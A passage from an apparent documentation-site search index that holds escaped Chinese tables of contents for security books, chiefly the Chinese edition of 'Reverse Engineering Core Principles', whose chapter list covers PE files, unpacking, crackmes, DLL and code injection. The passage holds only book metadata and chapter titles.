\u5bfb\u627e\u6d88\u606f\u5faa\u73af 827 23.6.3 WndProc\u6c47\u7f16\u5f62\u5f0f 828 23.7 \u83dc\u5355\u6269\u5c55 829 23.7.1 \u6269\u5145WndProc 829 23.7.2 \u6269\u5145Exit\u83dc\u5355\u7684\u529f\u80fd 830 23.7.3 \u6269\u5145Open\u83dc\u5355\u7684\u529f\u80fd 830 23.8 DLL\u6269\u5c55 833 23.8.1 \u6269\u5c55\u63a5\u53e3 833 23.8.2 \u6269\u5c55\u6d88\u606f\u5faa\u73af 834 \u8bed\u8a00\u548c\u5e73\u53f0\u7bc7 \u7b2c24\u7ae0 .NET\u5e73\u53f0\u52a0\u89e3\u5bc6 838 24.1 .NET\u6982\u8ff0 838 24.1.1 \u4ec0\u4e48\u662f .NET 838 24.1.2 \u57fa\u672c\u6982\u5ff5 839 24.1.3 \u7b2c1\u4e2a .NET\u7a0b\u5e8f 840 24.2 MSIL\u4e0e\u5143\u6570\u636e 841 24.2.1 PE\u7ed3\u6784\u7684\u6269\u5c55 841 24.2.2 .NET\u4e0b\u7684\u6c47\u7f16MSIL 847 24.2.3 MSIL\u4e0e\u5143\u6570\u636e\u7684\u7ed3\u5408 849 24.3 \u4ee3\u7801\u5206\u6790\u4e0e\u4fee\u6539\u6280\u672f 851 24.3.1 \u9759\u6001\u5206\u6790 851 24.3.2 \u52a8\u6001\u8c03\u8bd5 853 24.3.3 \u4ee3\u7801\u4fee\u6539 855 24.4 .NET\u4ee3\u7801\u4fdd\u62a4\u6280\u672f\u53ca\u5176\u9006\u5411 857 24.4.1 \u5f3a\u540d\u79f0 857 24.4.2 \u540d\u79f0\u6df7\u6dc6 859 24.4.3 \u6d41\u7a0b\u6df7\u6dc6 863 24.4.4 \u538b\u7f29 865 24.4.5 \u52a0\u5bc6 869 24.4.6 \u5176\u4ed6\u4fdd\u62a4\u624b\u6bb5 875 24.5 \u672c\u7ae0\u5c0f\u7ed3 876 \u53d6\u8bc1\u7bc7 \u7b2c25\u7ae0 \u6570\u636e\u53d6\u8bc1\u6280\u672f 878 25.1 \u786c\u76d8\u6570\u636e\u7684\u83b7\u53d6\u548c\u56fa\u5b9a 878 25.1.1 \u786c\u76d8\u6570\u636e\u7684\u83b7\u53d6 878 25.1.2 \u7535\u5b50\u6570\u636e\u7684\u56fa\u5b9a 882 25.2 \u786c\u76d8\u7684\u5206\u533a\u548c\u6570\u636e\u6062\u590d 882 25.2.1 \u5206\u533a\u7684\u89e3\u6790 884 25.2.2 \u57fa\u4e8e\u6587\u4ef6\u7cfb\u7edf\u7684\u6570\u636e\u6062\u590d\u539f\u7406 886 25.3 \u5185\u5b58\u5206\u6790 890 25.3.1 \u5185\u5b58\u955c\u50cf\u7684\u83b7\u53d6 891 25.3.2 \u5185\u5b58\u955c\u50cf\u7684\u5206\u6790 894 25.4 \u52a8\u6001\u4eff\u771f\u6280\u672f 897 25.4.1 \u4eff\u771f\u4e13\u7528\u786c\u4ef6 897 25.4.2 \u8f6f\u4ef6\u4eff\u771f 898 25.5 \u6ce8\u518c\u8868 900 25.5.1 Hive\u6587\u4ef6 900 25.5.2 \u6ce8\u518c\u8868\u4e2d\u7684\u65f6\u95f4 901 25.5.3 USB\u79fb\u52a8\u5b58\u50a8\u8bbe\u5907 902 25.6 \u6587\u4ef6\u683c\u5f0f 903 25.6.1 \u6587\u4ef6\u4fee\u590d\u548c\u7279\u5f81\u7801 903 25.6.2 \u57fa\u4e8e\u6587\u4ef6\u7684\u6570\u636e\u6062\u590d\u6280\u672f 904 25.6.3 \u6570\u636e\u9690\u85cf\u7684\u5206\u6790 906 \u672f\u8bed\u8868 909 \u53c2\u8003\u6587\u732e 911","title":"\u76ee\u5f55"},{"location":"Book/PWN/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/","text":"\u9006\u5411\u5de5\u7a0b\u6838\u5fc3\u539f\u7406 \u4f5c\u8005: [ \u97e9] \u674e\u627f\u8fdc \u51fa\u7248\u793e: \u4eba\u6c11\u90ae\u7535\u51fa\u7248\u793e \u539f\u4f5c\u540d: \ub9ac\ubc84\uc2f1 \ud575\uc2ec\uc6d0\ub9ac \u8bd1\u8005: \u6b66\u4f20\u6d77 \u51fa\u7248\u5e74: 2014-4-25 \u9875\u6570: 679 \u5b9a\u4ef7: 109.00\u5143 \u88c5\u5e27: \u5e73\u88c5 \u4e1b\u4e66: \u56fe\u7075\u7a0b\u5e8f\u8bbe\u8ba1\u4e1b\u4e66 ISBN: 9787115350183 \u5185\u5bb9\u7b80\u4ecb \u672c\u4e66\u5341\u5206\u8be6\u5c3d\u5730\u4ecb\u7ecd\u4e86\u4ee3\u7801\u9006\u5411\u5206\u6790\u7684\u6838\u5fc3\u539f\u7406\u3002\u4f5c\u8005\u5728Ahnlab \u7814\u7a76\u6240\u5de5\u4f5c\u591a\u5e74\uff0c\u4e66\u4e2d\u4e0d\u4ec5\u5305\u62ec\u5176\u4ee5\u6b64\u7ecf\u9a8c\u4e3a\u57fa\u7840\u4eb2\u81ea\u7f16\u5199\u7684\u5927\u91cf\u4ee3\u7801\uff0c\u8fd8\u5305\u542b\u4e86\u9006\u5411\u5de5\u7a0b\u7814\u7a76\u4eba\u5458\u5fc5\u987b\u4e86\u89e3\u7684\u5404\u79cd\u6280\u672f\u548c\u6280\u5de7\u3002\u5f7b\u5e95\u7406\u89e3\u5e76\u5207\u5b9e\u638c\u63e1\u9006\u5411\u5de5\u7a0b\u8fd9\u95e8\u6280\u672f\uff0c\u5c31\u80fd\u5728\u4f17\u591aIT \u76f8\u5173\u9886\u57df\u8fdb\u884c\u62d3\u5c55\u8fd0\u7528\uff0c\u8fd9\u672c\u4e66\u5c31\u662f\u901a\u5411\u9006\u5411\u5de5\u7a0b\u5927\u95e8\u7684\u6377\u5f84\u3002 \u60f3\u6210\u4e3a\u9006\u5411\u5de5\u7a0b\u7814\u7a76\u5458\u7684\u8bfb\u8005\u6216\u6b63\u5728\u4ece\u4e8b\u9006\u5411\u5f00\u53d1\u5de5\u4f5c\u7684\u5f00\u53d1\u4eba\u5458\u4e00\u5b9a\u4f1a\u901a\u8fc7\u672c\u4e66\u83b7\u5f97\u5f88\u5927\u5e2e\u52a9\u3002\u540c\u65f6\uff0c\u60f3\u6210\u4e3a\u5b89\u5168\u9886\u57df\u4e13\u5bb6\u7684\u4eba\u4e5f\u53ef\u4ece\u672c\u4e66\u8f7b\u677e\u8d77\u6b65\u3002 \u76ee\u5f55 \u7b2c\u4e00\u90e8\u5206\u3000\u4ee3\u7801\u9006\u5411\u6280\u672f\u57fa\u7840 \u7b2c1\u7ae0\u3000\u5173\u4e8e\u9006\u5411\u5de5\u7a0b 2 1.1\u3000\u9006\u5411\u5de5\u7a0b 2 1.2\u3000\u4ee3\u7801\u9006\u5411\u5de5\u7a0b 2 1.2.1\u3000\u9006\u5411\u5206\u6790\u6cd5 2 1.2.2\u3000\u6e90\u4ee3\u7801\u3001\u5341\u516d\u8fdb\u5236\u4ee3\u7801\u3001\u6c47\u7f16\u4ee3\u7801 4 1.2.3 \u201c\u6253\u8865\u4e01\u201d\u4e0e\u201c\u7834\u89e3\u201d 5 1.3\u3000\u4ee3\u7801\u9006\u5411\u51c6\u5907 5 1.3.1\u3000\u76ee\u6807 5 1.3.2\u3000\u6fc0\u60c5 6 1.3.3\u3000\u8c37\u6b4c 6 1.4\u3000\u5b66\u4e60\u9006\u5411\u5206\u6790\u6280\u672f\u7684\u7981\u5fcc 6 1.4.1\u3000\u8d2a\u5fc3 6 1.4.2\u3000\u6025\u8e81 7 1.5\u3000\u9006\u5411\u5206\u6790\u6280\u672f\u7684\u4e50\u8da3 7 \u7b2c2\u7ae0\u3000\u9006\u5411\u5206\u6790Hello World!\u7a0b\u5e8f 8 2.1\u3000Hello World!\u7a0b\u5e8f 8 2.2\u3000\u8c03\u8bd5HelloWorld.exe\u7a0b\u5e8f 9 2.2.1\u3000\u8c03\u8bd5\u76ee\u6807 9 2.2.2\u3000\u5f00\u59cb\u8c03\u8bd5 9 2.2.3\u3000\u5165\u53e3\u70b9 10 2.2.4\u3000\u8ddf\u8e2a40270C\u51fd\u6570 10 2.2.5\u3000\u8ddf\u8e2a40104F\u8df3\u8f6c\u8bed\u53e5 12 2.2.6\u3000\u67e5\u627emain()\u51fd\u6570 12 2.3\u3000\u8fdb\u4e00\u6b65\u719f\u6089\u8c03\u8bd5\u5668 14 2.3.1\u3000\u8c03\u8bd5\u5668\u6307\u4ee4 14 2.3.2 \u201c\u5927\u672c\u8425\u201d 15 2.3.3\u3000\u8bbe\u7f6e\u201c\u5927\u672c\u8425\u201d\u7684\u56db\u79cd\u65b9\u6cd5 15 2.4\u3000\u5feb\u901f\u67e5\u627e\u6307\u5b9a\u4ee3\u7801\u7684\u56db\u79cd\u65b9\u6cd5 17 2.4.1\u3000\u4ee3\u7801\u6267\u884c\u6cd5 18 2.4.2\u3000\u5b57\u7b26\u4e32\u68c0\u7d22\u6cd5 19 2.4.3\u3000API\u68c0\u7d22\u6cd5\uff081\uff09\uff1a\u5728\u8c03\u7528\u4ee3\u7801\u4e2d\u8bbe\u7f6e\u65ad\u70b9 20 2.4.4\u3000API\u68c0\u7d22\u6cd5\uff082\uff09\uff1a\u5728API\u4ee3\u7801\u4e2d\u8bbe\u7f6e\u65ad\u70b9 21 2.5\u3000\u4f7f\u7528\u201c\u6253\u8865\u4e01\u201d\u65b9\u5f0f\u4fee\u6539\u201cHello World!\u201d\u5b57\u7b26\u4e32 23 2.5.1 \u201c\u6253\u8865\u4e01\u201d 23 2.5.2\u3000\u4fee\u6539\u5b57\u7b26\u4e32\u7684\u4e24\u79cd\u65b9\u6cd5 24 2.6\u3000\u5c0f\u7ed3 28 \u7b2c3\u7ae0\u3000\u5c0f\u7aef\u5e8f\u6807\u8bb0\u6cd5 31 3.1\u3000\u5b57\u8282\u5e8f 31 3.1.1\u3000\u5927\u7aef\u5e8f\u4e0e\u5c0f\u7aef\u5e8f 32 3.1.2\u3000\u5728OllyDbg\u4e2d\u67e5\u770b\u5c0f\u7aef\u5e8f 32 \u7b2c4\u7ae0\u3000IA-32\u5bc4\u5b58\u5668\u57fa\u672c\u8bb2\u89e3 34 4.1\u3000\u4ec0\u4e48\u662fCPU\u5bc4\u5b58\u5668 34 4.2\u3000IA-32\u5bc4\u5b58\u5668 34 4.3\u3000\u5c0f\u7ed3 40 \u7b2c5\u7ae0\u3000\u6808 41 5.1\u3000\u6808 41 5.1.1\u3000\u6808\u7684\u7279\u5f81 41 5.1.2\u3000\u6808\u64cd\u4f5c\u793a\u4f8b 41 \u7b2c6\u7ae0\u3000\u5206\u6790abex\u2019 crackme#1 44 6.1\u3000abex\u2019 crackme #1 44 6.1.1\u3000\u5f00\u59cb\u8c03\u8bd5 45 6.1.2\u3000\u5206\u6790\u4ee3\u7801 45 6.2\u3000\u7834\u89e3 47 6.3\u3000\u5c06\u53c2\u6570\u538b\u5165\u6808 47 6.4\u3000\u5c0f\u7ed3 48 \u7b2c7\u7ae0\u3000\u6808\u5e27 49 7.1\u3000\u6808\u5e27 49 7.2\u3000\u8c03\u8bd5\u793a\u4f8b\uff1astackframe.exe 49 7.2.1\u3000StackFrame.cpp 50 7.2.2\u3000\u5f00\u59cb\u6267\u884cmain()\u51fd\u6570&\u751f\u6210\u6808\u5e27 51 7.2.3\u3000\u8bbe\u7f6e\u5c40\u90e8\u53d8\u91cf 52 7.2.4\u3000add()\u51fd\u6570\u53c2\u6570\u4f20\u9012\u4e0e\u8c03\u7528 53 7.2.5\u3000\u5f00\u59cb\u6267\u884cadd()\u51fd\u6570&\u751f\u6210\u6808\u5e27 54 7.2.6\u3000\u8bbe\u7f6eadd()\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\uff08x, y\uff09 55 7.2.7\u3000ADD\u8fd0\u7b97 55 7.2.8\u3000\u5220\u9664\u51fd\u6570add()\u7684\u6808\u5e27&\u51fd\u6570\u6267\u884c\u5b8c\u6bd5\uff08\u8fd4\u56de\uff09 56 7.2.9\u3000\u4ece\u6808\u4e2d\u5220\u9664\u51fd\u6570add()\u7684\u53c2\u6570\uff08\u6574\u7406\u6808\uff09 57 7.2.10\u3000\u8c03\u7528printf()\u51fd\u6570 58 7.2.11\u3000\u8bbe\u7f6e\u8fd4\u56de\u503c 58 7.2.12\u3000\u5220\u9664\u6808\u5e27&main()\u51fd\u6570\u7ec8\u6b62 58 7.3\u3000\u8bbe\u7f6eOllyDbg\u9009\u9879 59 7.3.1\u3000Disasm\u9009\u9879 59 7.3.2\u3000Analysis1\u9009\u9879 60 7.4\u3000\u5c0f\u7ed3 61 \u7b2c8\u7ae0\u3000abex\u2019 crackme #2 62 8.1\u3000\u8fd0\u884cabex\u2019 crackme #2 62 8.2\u3000Visual Basic\u6587\u4ef6\u7684\u7279\u5f81 63 8.2.1\u3000VB\u4e13\u7528\u5f15\u64ce 63 8.2.2\u3000\u672c\u5730\u4ee3\u7801\u548c\u4f2a\u4ee3\u7801 63 8.2.3\u3000\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f 63 8.2.4\u3000\u672a\u6587\u6863\u5316\u7684\u7ed3\u6784\u4f53 63 8.3\u3000\u5f00\u59cb\u8c03\u8bd5 63 8.3.1\u3000\u95f4\u63a5\u8c03\u7528 64 8.3.2\u3000RT_MainStruct\u7ed3\u6784\u4f53 64 8.3.3\u3000ThunRTMain()\u51fd\u6570 65 8.4\u3000\u5206\u6790crackme 65 8.4.1\u3000\u68c0\u7d22\u5b57\u7b26\u4e32 65 8.4.2\u3000\u67e5\u627e\u5b57\u7b26\u4e32\u5730\u5740 66 8.4.3\u3000\u751f\u6210Serial\u7684\u7b97\u6cd5 68 8.4.4\u3000\u9884\u6d4b\u4ee3\u7801 69 8.4.5\u3000\u8bfb\u53d6Name\u5b57\u7b26\u4e32\u7684\u4ee3\u7801 69 8.4.6\u3000\u52a0\u5bc6\u5faa\u73af 70 8.4.7\u3000\u52a0\u5bc6\u65b9\u6cd5 70 8.5\u3000\u5c0f\u7ed3 72 \u7b2c9\u7ae0\u3000Process Explorer\u2014\u2014 \u6700\u4f18\u79c0\u7684\u8fdb\u7a0b\u7ba1\u7406\u5de5\u5177 74 9.1\u3000Process Explorer 74 9.2\u3000\u5177\u4f53\u6709\u54ea\u4e9b\u4f18\u70b9\u5462 75 9.3\u3000sysinternals 75 \u7b2c10\u7ae0\u3000\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a 76 10.1\u3000\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a 76 10.1.1\u3000cdecl 76 10.1.2\u3000stdcall 77 10.1.3\u3000fastcall 78 \u7b2c11\u7ae0\u3000\u89c6\u9891\u8bb2\u5ea7 79 11.1\u3000\u8fd0\u884c 79 11.2\u3000\u5206\u6790 79 11.2.1\u3000\u76ee\u6807\uff081\uff09\uff1a\u53bb\u9664\u6d88\u606f\u6846 79 11.2.2\u3000\u6253\u8865\u4e01\uff081\uff09\uff1a\u53bb\u9664\u6d88\u606f\u6846 81 11.2.3\u3000\u76ee\u6807\uff082\uff09\uff1a\u67e5\u627e\u6ce8\u518c\u7801 83 11.3\u3000\u5c0f\u7ed3 85 \u7b2c12\u7ae0\u3000\u7a76\u7adf\u5e94\u5f53\u5982\u4f55\u5b66\u4e60\u4ee3\u7801\u9006\u5411\u5206\u6790 86 12.1\u3000\u9006\u5411\u5de5\u7a0b 86 12.1.1\u3000\u4efb\u4f55\u5b66\u4e60\u90fd\u5e94\u5f53\u6709\u76ee\u6807 86 12.1.2\u3000\u62e5\u6709\u79ef\u6781\u5fc3\u6001 86 12.1.3\u3000\u8981\u611f\u53d7\u5176\u4e2d\u7684\u4e50\u8da3 86 12.1.4\u3000\u8ba9\u68c0\u7d22\u6210\u4e3a\u65e5\u5e38\u751f\u6d3b\u7684\u4e00\u90e8\u5206 87 12.1.5\u3000\u6700\u91cd\u8981\u7684\u662f\u5b9e\u8df5 87 12.1.6\u3000\u8bf7\u4fdd\u6301\u5e73\u548c\u7684\u5fc3\u6001 87 \u7b2c\u4e8c\u90e8\u5206\u3000PE\u6587\u4ef6\u683c\u5f0f \u7b2c13\u7ae0\u3000PE\u6587\u4ef6\u683c\u5f0f 90 13.1\u3000\u4ecb\u7ecd 90 13.2\u3000PE\u6587\u4ef6\u683c\u5f0f 90 13.2.1\u3000\u57fa\u672c\u7ed3\u6784 91 13.2.2\u3000VA&RVA 92 13.3\u3000PE\u5934 92 13.3.1\u3000DOS\u5934 93 13.3.2\u3000DOS\u5b58\u6839 94 13.3.3\u3000NT\u5934 94 13.3.4\u3000NT\u5934\uff1a\u6587\u4ef6\u5934 95 13.3.5\u3000NT\u5934\uff1a\u53ef\u9009\u5934 97 13.3.6\u3000\u8282\u533a\u5934 101 13.4\u3000RVA to RAW 104 13.5\u3000IAT 105 13.5.1\u3000DLL 105 13.5.2\u3000IMAGE_IMPORT_DESCRIPTOR 107 13.5.3\u3000\u4f7f\u7528notepad.exe\u7ec3\u4e60 108 13.6\u3000EAT 112 13.6.1\u3000IMAGE_EXPORT_DIRECTORY 113 13.6.2\u3000\u4f7f\u7528kernel32.dll\u7ec3\u4e60 114 13.7\u3000\u9ad8\u7ea7PE 116 13.7.1\u3000PEView.exe 116 13.7.2\u3000Patched PE 117 13.8\u3000\u5c0f\u7ed3 118 \u7b2c14\u7ae0\u3000\u8fd0\u884c\u65f6\u538b\u7f29 121 14.1\u3000\u6570\u636e\u538b\u7f29 121 14.1.1\u3000\u65e0\u635f\u538b\u7f29 121 14.1.2\u3000\u6709\u635f\u538b\u7f29 121 14.2\u3000\u8fd0\u884c\u65f6\u538b\u7f29\u5668 122 14.2.1\u3000\u538b\u7f29\u5668 122 14.2.2\u3000\u4fdd\u62a4\u5668 123 14.3\u3000\u8fd0\u884c\u65f6\u538b\u7f29\u6d4b\u8bd5 123 \u7b2c15\u7ae0\u3000\u8c03\u8bd5UPX\u538b\u7f29\u7684notepad\u7a0b\u5e8f 127 15.1\u3000notepad.exe\u7684EP\u4ee3\u7801 127 15.2\u3000notepad_upx.exe\u7684EP\u4ee3\u7801 127 15.3\u3000\u8ddf\u8e2aUPX\u6587\u4ef6 129 15.3.1\u3000OllyDbg\u7684\u8ddf\u8e2a\u547d\u4ee4 129 15.3.2\u3000\u5faa\u73af #1 129 15.3.3\u3000\u5faa\u73af #2 130 15.3.4\u3000\u5faa\u73af #3 131 15.3.5\u3000\u5faa\u73af #4 131 15.4\u3000\u5feb\u901f\u67e5\u627eUPX OEP\u7684\u65b9\u6cd5 132 15.4.1\u3000\u5728POPAD\u6307\u4ee4\u540e\u7684JMP\u6307\u4ee4\u5904\u8bbe\u7f6e\u65ad\u70b9 132 15.4.2\u3000\u5728\u6808\u4e2d\u8bbe\u7f6e\u786c\u4ef6\u65ad\u70b9 133 15.5\u3000\u5c0f\u7ed3 133 \u7b2c16\u7ae0\u3000\u57fa\u5740\u91cd\u5b9a\u4f4d\u8868 135 16.1\u3000PE\u91cd\u5b9a\u4f4d 135 16.1.1\u3000DLL/SYS 135 16.1.2\u3000EXE 136 16.2\u3000PE\u91cd\u5b9a\u4f4d\u65f6\u6267\u884c\u7684\u64cd\u4f5c 136 16.3\u3000PE\u91cd\u5b9a\u4f4d\u64cd\u4f5c\u539f\u7406 138 16.3.1\u3000\u57fa\u5740\u91cd\u5b9a\u4f4d\u8868 138 16.3.2\u3000IMAGE_BASE_RELOCATION\u7ed3\u6784\u4f53 139 16.3.3\u3000\u57fa\u5740\u91cd\u5b9a\u4f4d\u8868\u7684\u5206\u6790\u65b9\u6cd5 139 16.3.4\u3000\u7ec3\u4e60 141 \u7b2c17\u7ae0\u3000\u4ece\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u5220\u9664.reloc\u8282\u533a 142 17.1\u3000.reloc\u8282\u533a 142 17.2\u3000reloc.exe 142 17.2.1\u3000\u5220\u9664.reloc\u8282\u533a\u5934 142 17.2.2\u3000\u5220\u9664.reloc\u8282\u533a 143 17.2.3\u3000\u4fee\u6539IMAGE_FILE_HEADER 143 17.2.4\u3000\u4fee\u6539IMAGE_OPTIONAL_HEADER 144 17.3\u3000\u5c0f\u7ed3 145 \u7b2c18\u7ae0\u3000UPack PE\u6587\u4ef6\u5934\u8be6\u7ec6\u5206\u6790 146 18.1\u3000UPack\u8bf4\u660e 146 18.2\u3000\u4f7f\u7528UPack\u538b\u7f29notepad.exe 146 18.3\u3000\u4f7f\u7528Stud_PE\u5de5\u5177 148 18.4\u3000\u6bd4\u8f83PE\u6587\u4ef6\u5934 148 18.4.1\u3000\u539fnotepad.exe\u7684PE\u6587\u4ef6\u5934 149 18.4.2\u3000notepad_upack.exe\u8fd0\u884c\u65f6\u538b\u7f29\u7684PE\u6587\u4ef6\u5934 149 18.5\u3000\u5206\u6790UPack\u7684PE\u6587\u4ef6\u5934 150 18.5.1\u3000\u91cd\u53e0\u6587\u4ef6\u5934 150 18.5.2\u3000IMAGE_FILE_HEADER.SizeOfOptionalHeader 150 18.5.3\u3000IMAGE_OPTIONAL_HEADER.NumberOf-RvaAndSizes 152 18.5.4\u3000IMAGE_SECTION_HEADER 153 18.5.5\u3000\u91cd\u53e0\u8282\u533a 155 18.5.6\u3000RVA to RAW 156 18.5.7\u3000\u5bfc\u5165\u8868\uff08IMAGE_IMPORT_DESCRIPTOR array\uff09 158 18.5.8\u3000\u5bfc\u5165\u5730\u5740\u8868 160 18.6\u3000\u5c0f\u7ed3 161 \u7b2c19\u7ae0\u3000UPack\u8c03\u8bd5 ? \u67e5\u627eOEP 162 19.1\u3000OllyDbg\u8fd0\u884c\u9519\u8bef 162 19.2\u3000\u89e3\u7801\u5faa\u73af 163 19.3\u3000\u8bbe\u7f6eIAT 165 19.4\u3000\u5c0f\u7ed3 166 \u7b2c20\u7ae0\u3000\u201c\u5185\u5d4c\u8865\u4e01\u201d\u7ec3\u4e60 167 20.1\u3000\u5185\u5d4c\u8865\u4e01 167 20.2\u3000\u7ec3\u4e60\uff1aPatchme 168 20.3\u3000\u8c03\u8bd5\uff1a\u67e5\u770b\u4ee3\u7801\u6d41 168 20.4\u3000\u4ee3\u7801\u7ed3\u6784 172 20.5 \u201c\u5185\u5d4c\u8865\u4e01\u201d\u7ec3\u4e60 173 20.5.1\u3000\u8865\u4e01\u4ee3\u7801\u8981\u8bbe\u7f6e\u5728\u4f55\u5904\u5462 173 20.5.2\u3000\u5236\u4f5c\u8865\u4e01\u4ee3\u7801 175 20.5.3\u3000\u6267\u884c\u8865\u4e01\u4ee3\u7801 176 20.5.4\u3000\u7ed3\u679c\u786e\u8ba4 177 \u7b2c\u4e09\u90e8\u5206\u3000DLL\u6ce8\u5165 \u7b2c21\u7ae0\u3000Windows\u6d88\u606f\u94a9\u53d6 180 21.1\u3000\u94a9\u5b50 180 21.2\u3000\u6d88\u606f\u94a9\u5b50 180 21.3\u3000SetWindowsHookEx() 181 21.4\u3000\u952e\u76d8\u6d88\u606f\u94a9\u53d6\u7ec3\u4e60 182 21.4.1\u3000\u7ec3\u4e60\u793a\u4f8bHookMain.exe 182 21.4.2\u3000\u5206\u6790\u6e90\u4ee3\u7801 185 21.5\u3000\u8c03\u8bd5\u7ec3\u4e60 187 21.5.1\u3000\u8c03\u8bd5HookMain.exe 188 21.5.2\u3000\u8c03\u8bd5Notepad.exe\u8fdb\u7a0b\u5185\u7684KeyHook.dll 190 21.6\u3000\u5c0f\u7ed3 192 \u7b2c22\u7ae0\u3000\u6076\u610f\u952e\u76d8\u8bb0\u5f55\u5668 194 22.1\u3000\u6076\u610f\u952e\u76d8\u8bb0\u5f55\u5668\u7684\u76ee\u6807 194 22.1.1\u3000\u5728\u7ebf\u6e38\u620f 194 22.1.2\u3000\u7f51\u4e0a\u94f6\u884c 194 22.1.3\u3000\u5546\u4e1a\u673a\u5bc6\u6cc4\u9732 194 22.2\u3000\u952e\u76d8\u8bb0\u5f55\u5668\u7684\u79cd\u7c7b\u4e0e\u53d1\u5c55\u8d8b\u52bf 195 22.3\u3000\u9632\u8303\u6076\u610f\u952e\u76d8\u8bb0\u5f55\u5668 195 22.4\u3000\u4e2a\u4eba\u4fe1\u606f 195 \u7b2c23\u7ae0\u3000DLL\u6ce8\u5165 197 23.1\u3000DLL\u6ce8\u5165 197 23.2\u3000DLL\u6ce8\u5165\u793a\u4f8b 198 23.2.1\u3000\u6539\u5584\u529f\u80fd\u4e0e\u4fee\u590dBug 198 23.2.2\u3000\u6d88\u606f\u94a9\u53d6 198 23.2.3\u3000API\u94a9\u53d6 198 23.2.4\u3000\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f 199 23.2.5\u3000\u6076\u610f\u4ee3\u7801 199 23.3\u3000DLL\u6ce8\u5165\u7684\u5b9e\u73b0\u65b9\u6cd5 199 23.4\u3000CreateRemoteThread() 199 23.4.1\u3000\u7ec3\u4e60\u793a\u4f8bmyhack.dll 199 23.4.2\u3000\u5206\u6790\u793a\u4f8b\u6e90\u4ee3\u7801 203 23.4.3\u3000\u8c03\u8bd5\u65b9\u6cd5 208 23.5\u3000AppInit_DLLs 210 23.5.1\u3000\u5206\u6790\u793a\u4f8b\u6e90\u7801 211 23.5.2\u3000\u7ec3\u4e60\u793a\u4f8bmyhack2.dll 212 23.6\u3000SetWindowsHookEx() 214 23.7\u3000\u5c0f\u7ed3 214 \u7b2c24\u7ae0\u3000DLL\u5378\u8f7d 216 24.1\u3000DLL\u5378\u8f7d\u7684\u5de5\u4f5c\u539f\u7406 216 24.2\u3000\u5b9e\u73b0DLL\u5378\u8f7d 216 24.2.1\u3000\u83b7\u53d6\u8fdb\u7a0b\u4e2d\u52a0\u8f7d\u7684DLL\u4fe1\u606f 219 24.2.2\u3000\u83b7\u53d6\u76ee\u6807\u8fdb\u7a0b\u7684\u53e5\u67c4 220 24.2.3\u3000\u83b7\u53d6FreeLibrary() API\u5730\u5740 220 24.2.4\u3000\u5728\u76ee\u6807\u8fdb\u7a0b\u4e2d\u8fd0\u884c\u7ebf\u7a0b 220 24.3\u3000DLL\u5378\u8f7d\u7ec3\u4e60 220 24.3.1\u3000\u590d\u5236\u6587\u4ef6\u53ca\u8fd0\u884cnotepad.exe 220 24.3.2\u3000\u6ce8\u5165myhack.dll 221 24.3.3\u3000\u5378\u8f7dmyhack.dll 222 \u7b2c25\u7ae0\u3000\u901a\u8fc7\u4fee\u6539PE\u52a0\u8f7dDLL 224 25.1\u3000\u7ec3\u4e60\u6587\u4ef6 224 25.1.1\u3000TextView.exe 224 25.1.2\u3000TextView_patched.exe 225 25.2\u3000\u6e90\u4ee3\u7801 - myhack3.cpp 227 25.2.1\u3000DllMain() 227 25.2.2\u3000DownloadURL() 228 25.2.3\u3000DropFile() 229 25.2.4\u3000dummy() 230 25.3\u3000\u4fee\u6539TextView.exe\u6587\u4ef6\u7684\u51c6\u5907\u5de5\u4f5c 231 25.3.1\u3000\u4fee\u6539\u601d\u8def 231 25.3.2\u3000\u67e5\u770bIDT\u662f\u5426\u6709\u8db3\u591f\u7a7a\u95f4 231 25.3.3\u3000\u79fb\u52a8IDT 233 25.4\u3000\u4fee\u6539TextView.exe 235 25.4.1\u3000\u4fee\u6539\u5bfc\u5165\u8868\u7684RVA\u503c 235 25.4.2\u3000\u5220\u9664\u7ed1\u5b9a\u5bfc\u5165\u8868 235 25.4.3\u3000\u521b\u5efa\u65b0IDT 235 25.4.4\u3000\u8bbe\u7f6eName\u3001INT\u3001IAT 236 25.4.5\u3000\u4fee\u6539IAT\u8282\u533a\u7684\u5c5e\u6027\u503c 238 25.5\u3000\u68c0\u6d4b\u9a8c\u8bc1 240 25.6\u3000\u5c0f\u7ed3 241 \u7b2c26\u7ae0\u3000PE Tools 242 26.1\u3000PE Tools 242 26.1.1\u3000\u8fdb\u7a0b\u5185\u5b58\u8f6c\u50a8 243 26.1.2\u3000PE\u7f16\u8f91\u5668 245 26.2\u3000\u5c0f\u7ed3 245 \u7b2c27\u7ae0\u3000\u4ee3\u7801\u6ce8\u5165 247 27.1\u3000\u4ee3\u7801\u6ce8\u5165 247 27.2\u3000DLL\u6ce8\u5165\u4e0e\u4ee3\u7801\u6ce8\u5165 247 27.3\u3000\u7ec3\u4e60\u793a\u4f8b 249 27.3.1\u3000\u8fd0\u884cnotepad.exe 249 27.3.2\u3000\u8fd0\u884cCodeInjection.exe 249 27.3.3\u3000\u5f39\u51fa\u6d88\u606f\u6846 250 27.4\u3000CodeInjection.cpp 250 27.4.1\u3000main()\u51fd\u6570 251 27.4.2\u3000ThreadProc()\u51fd\u6570 251 27.4.3\u3000InjectCode()\u51fd\u6570 254 27.5\u3000\u4ee3\u7801\u6ce8\u5165\u8c03\u8bd5\u7ec3\u4e60 256 27.5.1\u3000\u8c03\u8bd5notepad.exe 256 27.5.2\u3000\u8bbe\u7f6eOllyDbg\u9009\u9879 256 27.5.3\u3000\u8fd0\u884cCodeInjection.exe 257 27.5.4\u3000\u7ebf\u7a0b\u5f00\u59cb\u4ee3\u7801 258 27.6\u3000\u5c0f\u7ed3 259 \u7b2c28\u7ae0\u3000\u4f7f\u7528\u6c47\u7f16\u8bed\u8a00\u7f16\u5199\u6ce8\u5165\u4ee3\u7801 260 28.1\u3000\u76ee\u6807 260 28.2\u3000\u6c47\u7f16\u7f16\u7a0b 260 28.3\u3000OllyDbg\u7684\u6c47\u7f16\u547d\u4ee4 260 28.3.1\u3000\u7f16\u5199ThreadProc()\u51fd\u6570 262 28.3.2\u3000\u4fdd\u5b58\u6587\u4ef6 265 28.4\u3000\u7f16\u5199\u4ee3\u7801\u6ce8\u5165\u7a0b\u5e8f 266 